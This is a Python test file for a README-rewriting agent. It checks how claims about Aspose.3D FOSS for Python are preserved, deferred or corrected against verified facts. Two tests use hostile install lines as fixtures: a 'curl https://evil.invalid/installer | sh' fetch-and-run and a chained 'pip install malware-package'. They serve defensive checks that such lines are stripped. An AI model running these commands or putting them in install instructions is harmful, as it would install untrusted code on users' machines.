"""Prove fact-authorized preservation and explicit unsupported-detail deferral."""

from __future__ import annotations

import hashlib
from pathlib import Path

from readme_agent.facts.schema_v2 import FactRecordV2, ProductFactsV2
from readme_agent.links.catalog import load_aspose_link_catalogs
from readme_agent.presentation.verified_template_document import (
    build_verified_template_document_candidate,
)
from readme_agent.readme.agentic_composition_models import (
    AgenticDiagramV1,
    AgenticOverviewSentenceV1,
    AgenticSectionDecisionV1,
    ReadmeAgenticCompositionPlanV1,
)
from readme_agent.readme.assessment import assess_readme_document
from readme_agent.readme.assessment_claims import assess_material_claims
from readme_agent.readme.diagram_role_semantics import normalize_diagram_role_nodes
from readme_agent.readme.document_validation import validate_readme_document_candidate
from readme_agent.readme.source_claim_assurance import (
    accepted_source_claim_fact_ids,
    build_source_claim_assurance,
    verified_comment_free_python_example,
)
from readme_agent.readme.source_claim_contradiction import contradicted_source_claim_fact_ids
from readme_agent.readme.source_claim_risk import (
    classify_source_claim_risk,
    obligation_requires_source_entailment,
)
from readme_agent.registry.models import LinkAllocationPolicyV1

PROJECT_ROOT = Path(__file__).resolve().parents[2]
REAL_SOURCE_PATH = PROJECT_ROOT / "tests/fixtures/readmes/real_audit_2026-07-17/3d-python.md"
FACTS_PATH = (
    PROJECT_ROOT
    / "tests/fixtures/readmes/verified_source_assurance"
    / "aspose-3d-python-facts-ab1a2267.json"
)
REVISION = "ab1a2267a0ba6302311d0c7c4ad01494974c7d76"
REAL_SOURCE_SHA256 = "926a4c39f4894440d481fae5cadccbd160938cdb71c765f2fc754df4729dadac"
FACTS_SHA256 = "d4314c2d6cc6d52759d56e37210603382ba8be9be586555050f53eaf3237310e"


def _facts() -> ProductFactsV2:
    payload = FACTS_PATH.read_text(encoding="utf-8")
    assert hashlib.sha256(payload.encode()).hexdigest() == FACTS_SHA256
    return ProductFactsV2.model_validate_json(payload)


def _registry_acquisition_facts() -> ProductFactsV2:
    facts = _facts()
    fact_id = facts.selected_fact_ids["installation.verified_acquisition"]
    acquisition = facts.fact_by_id(fact_id)
    coordinate = {"name": "aspose-3d-foss"}
    replacement = acquisition.model_copy(
        update={
            "value": {
                "method": "pypi",
                "outcome": "REGISTRY_VERIFIED",
                "coordinate": coordinate,
                "registry_receipt": {
                    "coordinate": coordinate,
                    "status_code": 200,
                    "found": True,
                },
                "source_build_receipt": None,
                "truth_eligible": True,
            }
        }
    )
    return facts.model_copy(
        update={"facts": [replacement if fact.fact_id == fact_id else fact for fact in facts.facts]}
    )


def _plan(source: str, facts: ProductFactsV2) -> ReadmeAgenticCompositionPlanV1:
    identity = facts.selected_fact("product.identity")
    audience = facts.selected_fact("product.audience")
    audience_text = str(audience.value[0] if isinstance(audience.value, list) else audience.value)
    revision = identity.source.source_revision
    assert revision is not None
    assessment = assess_readme_document(
        facts.org_repo,
        source,
        facts,
        base_revision=revision,
    )
    return ReadmeAgenticCompositionPlanV1(
        org_repo=facts.org_repo,
        source_sha256=assessment.source_sha256,
        facts_hash=facts.canonical_hash(),
        assessment_hash=assessment.canonical_hash(),
        prompt_sha256="c" * 64,
        tool_schema_sha256="d" * 64,
        input_sha256="e" * 64,
        model="fixture-author",
        attempt_count=1,
        repository_summary="Organize accepted repository facts for a visitor.",
        section_decisions=[
            AgenticSectionDecisionV1(
                section_id="opening",
                disposition="rewrite",
                priority=100,
                supporting_fact_ids=[identity.fact_id, audience.fact_id],
                rationale="Lead with accepted identity and audience evidence.",
            )
        ],
        overview_sentences=[
            AgenticOverviewSentenceV1(
                text=audience_text,
                supporting_fact_ids=[audience.fact_id],
            )
        ],
        diagram=AgenticDiagramV1(
            nodes=normalize_diagram_role_nodes(
                [],
                facts,
                {"input": 1, "capability": 1, "output": 1},
            )
        ),
    )


def _build(source: str):
    facts = _facts()
    catalogs = load_aspose_link_catalogs()
    candidate, plan = build_verified_template_document_candidate(
        facts,
        source,
        REVISION,
        _plan(source, facts),
        link_catalogs=catalogs,
        link_allocation_policy=LinkAllocationPolicyV1(),
    )
    validation = validate_readme_document_candidate(
        source,
        candidate,
        plan,
        facts,
        link_catalogs=catalogs,
    )
    return candidate, plan, validation


def test_structured_source_facts_follow_an_exact_preserved_placement_end_to_end() -> None:
    source = (
        "# Product\n\n## Repository details\n\n- Work with `Matrix4` utilities for transforms.\n"
    )
    facts = _facts()
    identity = facts.selected_fact("product.identity")
    api = FactRecordV2(
        fact_id="api.public_surface:preserved-placement-regression",
        field="api.public_surface",
        verification_state="verified",
        value={
            "classes": [
                {
                    "name": "Matrix4",
                    "source_path": "package/Matrix4.py",
                    "source_sha256": "a" * 64,
                    "members": [],
                }
            ],
            "modules": [],
        },
        source=identity.source,
        authoritative_owner="repository-source",
        confidence=1.0,
        affected_surfaces=["readme"],
    )
    facts = facts.model_copy(
        update={
            "facts": [*facts.facts, api],
            "selected_fact_ids": {**facts.selected_fact_ids, api.field: api.fact_id},
        }
    )
    catalogs = load_aspose_link_catalogs()

    candidate, plan = build_verified_template_document_candidate(
        facts,
        source,
        REVISION,
        _plan(source, facts),
        link_catalogs=catalogs,
        link_allocation_policy=LinkAllocationPolicyV1(),
    )
    validation = validate_readme_document_candidate(
        source,
        candidate,
        plan,
        facts,
        link_catalogs=catalogs,
    )

    assert candidate.count("- Work with `Matrix4` utilities for transforms.\n") == 1
    assert plan.claim_accountability is not None
    source_record = next(
        record for record in plan.claim_accountability.claims if record.stage == "source"
    )
    candidate_record = next(
        record
        for record in plan.claim_accountability.claims
        if record.stage == "candidate" and record.content_sha256 == source_record.content_sha256
    )
    expected_fact_ids = {
        api.fact_id,
        facts.selected_fact_ids["product.capabilities"],
    }
    assert source_record.survives_in_candidate is True
    assert source_record.currently_accountable is True
    assert set(source_record.accepted_fact_ids) == expected_fact_ids
    assert candidate_record.origin == "inherited"
    assert candidate_record.currently_accountable is True
    assert set(candidate_record.accepted_fact_ids) == expected_fact_ids
    assert validation.checks["claim_accountability_complete"] is True


def test_generic_preserve_does_not_reinsert_partially_verified_format_claims() -> None:
    partially_verified_format = "- **GLTF** - GL Transmission Format (glTF 2.0)\n"
    unsupported_detail = "- Imaginary future format with unverified acceleration\n"
    source = (
        "# Aspose.3D FOSS for Python\n\n"
        "## Supported Formats\n\n"
        f"{partially_verified_format}{unsupported_detail}"
    )

    candidate, plan, validation = _build(source)

    assert partially_verified_format not in candidate
    assert unsupported_detail not in candidate
    assert not validation.valid
    assert not [
        resolution
        for resolution in plan.source_claim_resolutions
        if resolution.resolution == "deferred_verification"
    ]
    assert plan.claim_accountability is not None
    source_bytes = source.encode("utf-8")
    records = [
        record
        for record in plan.claim_accountability.claims
        if record.stage == "source"
        and source_bytes[record.source_byte_start : record.source_byte_end].decode("utf-8")
        in {partially_verified_format, unsupported_detail}
    ]
    assert len(records) == 2
    assert all(not record.currently_accountable for record in records)
    assert all(record.expected_disposition == "unjustified_loss" for record in records)
    assert all(not record.survives_in_candidate for record in records)


def test_optional_secondary_quick_start_is_deferred_with_exact_evidence() -> None:
    optional_detail = "Alternative optional workflow detail.\n"
    source = (
        f"# Aspose.3D FOSS for Python\n\n## Quick Start\n\n### Alternative\n\n{optional_detail}"
    )

    candidate, plan, validation = _build(source)

    assert optional_detail not in candidate
    assert not validation.valid
    resolution = next(
        item for item in plan.source_claim_resolutions if item.resolution == "deferred_verification"
    )
    source_claim = assess_material_claims(source)[0]
    source_hash = hashlib.sha256(optional_detail.encode("utf-8")).hexdigest()
    candidate_hash = hashlib.sha256(candidate.encode("utf-8")).hexdigest()
    assert resolution.claim_id == source_claim.claim_id
    assert resolution.content_sha256 == source_hash
    assert resolution.evidence == [
        f"source-claim:{source_claim.claim_id}",
        f"source-content-sha256:{source_hash}",
        f"candidate-content-sha256:{candidate_hash}",
        "authority:verified-source-assurance:correction-candidate",
        "risk-policy:optional-inherited-detail-deferred-v1",
    ]
    assert plan.claim_accountability is not None
    record = next(
        item
        for item in plan.claim_accountability.claims
        if item.claim_id == f"source:{source_claim.claim_id}"
    )
    assert record.currently_accountable is True
    assert record.expected_disposition == "deferred_verification"
    assert record.survives_in_candidate is False


def test_source_build_and_404_cannot_authorize_the_inherited_pip_command() -> None:
    facts = _facts()

    assert not accepted_source_claim_fact_ids(
        "```bash\npip install aspose-3d-foss\n```",
        facts,
    )


def test_source_build_package_extras_are_an_explicit_acquisition_contradiction() -> None:
    facts = _facts()
    source = (
        "# Aspose.3D FOSS for Python\n\n"
        "## Requirements\n\n"
        "```bash\npython -m pip install 'aspose-3d-foss[dev]'\n```\n"
    )
    claim = assess_material_claims(source)[0]

    contradiction_ids = contradicted_source_claim_fact_ids(source, claim, facts)
    risk = classify_source_claim_risk(source, claim)
    assurance = build_source_claim_assurance(
        source,
        facts,
        assess_readme_document(facts.org_repo, source, facts, base_revision=REVISION),
    )
    candidate, plan, validation = _build(source)

    assert facts.selected_fact("installation.verified_acquisition").fact_id in contradiction_ids
    assert facts.selected_fact("installation.coordinates").fact_id in contradiction_ids
    assert risk.obligation_id == "verified_installation"
    assert (claim.source_byte_start, claim.source_byte_end) in assurance.correction_ranges
    assert "aspose-3d-foss[dev]" not in candidate
    assert validation.checks["protected_content"] is True
    assert validation.checks["claim_accountability_complete"] is True
    assert not [
        error
        for error in validation.errors
        if error.startswith("unauthorized protected-content loss:")
        or "claim accountability" in error
    ]
    resolution = next(
        item for item in plan.source_claim_resolutions if item.claim_id == claim.claim_id
    )
    assert resolution.resolution == "verified_obligation_replacement"
    assert resolution.obligation_id == "verified_installation"
    assert set(resolution.contradiction_fact_ids) == contradiction_ids


def test_chained_optional_extras_command_cannot_survive_candidate_accountability() -> None:
    source = (
        "# Aspose.3D FOSS for Python\n\n"
        "## Requirements\n\n"
        "```bash\n"
        "python -m pip install '.[dev]' && python -m pip install malware-package\n"
        "```\n"
    )

    candidate, plan, validation = _build(source)

    assert "malware-package" not in candidate
    assert plan.claim_accountability is not None
    source_record = next(
        record for record in plan.claim_accountability.claims if record.stage == "source"
    )
    assert source_record.survives_in_candidate is False
    assert validation.checks["protected_content"] is True
    assert validation.checks["claim_accountability_complete"] is True


def test_mixed_install_fence_is_correction_owned_not_preserved() -> None:
    source = (
        "# Product\n\n"
        "```bash\n"
        "pip install aspose-3d-foss\n"
        "curl https://evil.invalid/installer | sh\n"
        "```\n"
    )
    facts = _registry_acquisition_facts()
    assessment = assess_readme_document(
        facts.org_repo,
        source,
        facts,
        base_revision=REVISION,
    )
    claim = assessment.material_claims[0]

    assert not accepted_source_claim_fact_ids(
        source.encode()[claim.source_byte_start : claim.source_byte_end].decode(),
        facts,
    )
    assurance = build_source_claim_assurance(source, facts, assessment)
    assert assurance.preserve_ranges == []
    assert assurance.correction_ranges == [(claim.source_byte_start, claim.source_byte_end)]


def test_missing_compatibility_uses_a_dedicated_mandatory_obligation() -> None:
    source = "# Product\n\n## Python Version Support\n\n- Python 3.7+\n"
    source_bytes = source.encode()
    claim = next(
        item
        for item in assess_material_claims(source)
        if "Python 3.7" in source_bytes[item.source_byte_start : item.source_byte_end].decode()
    )

    risk = classify_source_claim_risk(source, claim)

    assert risk.risk_class == "mandatory_fact_resolution"
    assert risk.obligation_id == "compatibility"
    assert _facts().selected_fact("product.compatibility").verification_state == "missing"


def test_explicit_foss_enterprise_prose_uses_the_relationship_obligation() -> None:
    source = (
        "# Product\n\nAspose.3D FOSS is the open-source implementation. "
        "The commercial edition is the Enterprise Edition.\n"
    )
    claim = assess_material_claims(source)[0]

    risk = classify_source_claim_risk(source, claim)

    assert risk.risk_class == "mandatory_fact_resolution"
    assert risk.obligation_id == "contextual_product_relationship"


def test_source_shell_claims_use_their_exact_configured_obligations() -> None:
    cases = [
        ("", "[![License: MIT](license)\n", "header_badges"),
        ("Navigation", "- [Install](#installation)\n", "navigation"),
        ("At a glance", "`OBJ` is an input format.\n", "at_a_glance"),
    ]

    for heading, claim_text, expected in cases:
        section = f"## {heading}\n\n" if heading else ""
        source = f"# Product\n\n{section}{claim_text}"
        claim = next(
            item
            for item in assess_material_claims(source)
            if claim_text.strip()
            in source.encode()[item.source_byte_start : item.source_byte_end].decode().strip()
        )

        risk = classify_source_claim_risk(source, claim)

        assert risk.risk_class == "mandatory_fact_resolution"
        assert risk.obligation_id == expected


def test_source_repository_detail_uses_specific_fact_obligations() -> None:
    cases = [
        ("Additional examples", "- `examples/convert.py`\n", "additional_examples"),
        ("MS OneNote Examples", "More examples are under `examples/`.\n", "additional_examples"),
        ("API reference", "- `Scene.open(path)` loads a scene.\n", "api_public_surface"),
        (
            "Documentation & resources",
            "- Read the format guide in `docs/formats.md`.\n",
            "documentation_resources",
        ),
        (
            "Documentation & resources",
            "- Open an issue for support.\n",
            "support_routes",
        ),
        ("Development and testing", "- Run `pytest -q`.\n", "development_commands"),
        ("Development", "Run tests with `pytest -q`.\n", "development_commands"),
        (
            "Development",
            "Third-party notices are in `THIRD_PARTY_NOTICES.md`.\n",
            "third_party_notices",
        ),
    ]

    for heading, claim_text, expected in cases:
        source = f"# Product\n\n## {heading}\n\n{claim_text}"
        claim = next(
            item
            for item in assess_material_claims(source)
            if claim_text.strip()
            in source.encode()[item.source_byte_start : item.source_byte_end].decode().strip()
        )

        risk = classify_source_claim_risk(source, claim)

        assert risk.risk_class == "mandatory_fact_resolution"
        assert risk.obligation_id == expected


def test_repository_golden_workflow_requires_typed_canonical_replacement() -> None:
    source = "# Product\n\n## PDF golden workflow\n\nRegenerate internal baselines.\n"
    claim = assess_material_claims(source)[0]

    risk = classify_source_claim_risk(source, claim)

    assert risk.risk_class == "mandatory_fact_resolution"
    assert risk.obligation_id == "golden_workflow"
    assert obligation_requires_source_entailment("golden_workflow")


def test_api_disclosure_shell_is_structural_and_compatibility_is_correctable() -> None:
    source = (
        "# Product\n\n## API reference\n\n"
        "<details>\n<summary>View the supported public API surface</summary>\n\n"
        "</details>\n"
    )
    risks = [classify_source_claim_risk(source, claim) for claim in assess_material_claims(source)]

    assert [risk.obligation_id for risk in risks] == ["api_structure", "api_structure"]
    assert not obligation_requires_source_entailment("api_structure")
    assert not obligation_requires_source_entailment("compatibility")
    assert obligation_requires_source_entailment("api_public_surface")
    assert obligation_requires_source_entailment("product_overview")


def test_comment_removal_requires_complete_verified_example_ast_equivalence() -> None:
    verified = "from aspose.threed import Scene\n\nscene = Scene()\n"
    source = (
        "```python\n"
        "from aspose.threed import Scene\n\n"
        "# Construct the verified scene.\n"
        "scene = Scene()\n"
        "```"
    )

    transformed = verified_comment_free_python_example(source, verified)

    assert transformed is not None
    assert "# Construct" not in transformed
    assert "from aspose.threed import Scene" in transformed
    assert "scene = Scene()" in transformed


def test_comment_removal_rejects_a_thinner_fact_for_a_richer_example() -> None:
    verified = "from aspose.threed import Scene\n\nscene = Scene()\n"
    richer = (
        "```python\nfrom aspose.threed import Scene\nscene = Scene()\nscene.open('model.obj')\n```"
    )

    assert verified_comment_free_python_example(richer, verified) is None


def test_mandatory_unsupported_security_claim_remains_blocking() -> None:
    unsupported = "All reports are guaranteed vulnerability-free.\n"
    source = f"# Aspose.3D FOSS for Python\n\n## Security\n\n{unsupported}"

    candidate, plan, validation = _build(source)

    assert unsupported not in candidate
    assert validation.checks["claim_accountability_complete"] is False
    assert not any(
        resolution.resolution == "deferred_verification"
        for resolution in plan.source_claim_resolutions
    )
    assert plan.claim_accountability is not None
    assert any(
        not record.currently_accountable
        and record.stage == "source"
        and record.current_disposition == "preserve"
        and record.expected_disposition == "unjustified_loss"
        and record.content_sha256 == hashlib.sha256(unsupported.encode("utf-8")).hexdigest()
        and not record.survives_in_candidate
        for record in plan.claim_accountability.claims
    )


def test_real_3d_source_remains_blocked_until_granular_claims_and_example_are_verified() -> None:
    source = REAL_SOURCE_PATH.read_text(encoding="utf-8")
    assert hashlib.sha256(source.encode()).hexdigest() == REAL_SOURCE_SHA256

    candidate, plan, validation = _build(source)

    assert not validation.valid
    assert not validation.checks["claim_accountability_complete"]
    assert "pip install aspose-3d-foss" not in candidate
    gltf_claim = "- **GLTF** - GL Transmission Format (glTF 2.0)\n"
    assert gltf_claim not in candidate
    gltf_source_claim = next(
        claim
        for claim in assess_material_claims(source)
        if source.encode()[claim.source_byte_start : claim.source_byte_end].decode() == gltf_claim
    )
    assert gltf_source_claim.claim_id not in {
        resolution.claim_id
        for resolution in plan.source_claim_resolutions
        if resolution.resolution == "deferred_verification"
    }
    assert plan.claim_accountability is not None
    source_bytes = source.encode("utf-8")
    gltf_record = next(
        record
        for record in plan.claim_accountability.claims
        if record.stage == "source"
        and source_bytes[record.source_byte_start : record.source_byte_end].decode("utf-8")
        == gltf_claim
    )
    assert gltf_record.currently_accountable is False
    assert gltf_record.expected_disposition == "unjustified_loss"
    assert gltf_record.survives_in_candidate is False
    rich_quick_start = next(
        record
        for record in plan.claim_accountability.claims
        if record.stage == "source"
        and "ObjLoadOptions"
        in source_bytes[record.source_byte_start : record.source_byte_end].decode("utf-8")
    )
    assert rich_quick_start.currently_accountable is False
    assert rich_quick_start.expected_disposition == "unjustified_loss"
    assert rich_quick_start.survives_in_candidate is False
    assert "example.minimal:compiled-salvaged-example" not in rich_quick_start.accepted_fact_ids
    assert not any(
        resolution.claim_id == rich_quick_start.claim_id.removeprefix("source:")
        for resolution in plan.source_claim_resolutions
    )
    relationship_claim = next(
        record
        for record in plan.claim_accountability.claims
        if record.stage == "source" and record.source_byte_start == 349
    )
    relationship_resolution = next(
        resolution
        for resolution in plan.source_claim_resolutions
        if resolution.claim_id == relationship_claim.claim_id.removeprefix("source:")
    )
    assert relationship_claim.currently_accountable is True
    assert relationship_claim.expected_disposition == "verified_obligation_replacement"
    assert relationship_resolution.obligation_id == "contextual_product_relationship"
    assert relationship_resolution.replacement_provenance_ids
    opening_overview = next(
        record
        for record in plan.claim_accountability.claims
        if record.stage == "source" and record.source_byte_start == 29
    )
    assert opening_overview.currently_accountable is True
    assert opening_overview.survives_in_candidate is False
    assert opening_overview.expected_disposition == "deferred_verification"
    opening_resolution = next(
        resolution
        for resolution in plan.source_claim_resolutions
        if resolution.claim_id == opening_overview.claim_id.removeprefix("source:")
    )
    assert opening_resolution.resolution == "deferred_verification"
    assert "unverified-source-detail-for:product_overview" in opening_resolution.evidence
    assert not any(
        resolution.claim_id == opening_overview.claim_id.removeprefix("source:")
        and resolution.obligation_id == "license"
        for resolution in plan.source_claim_resolutions
    )
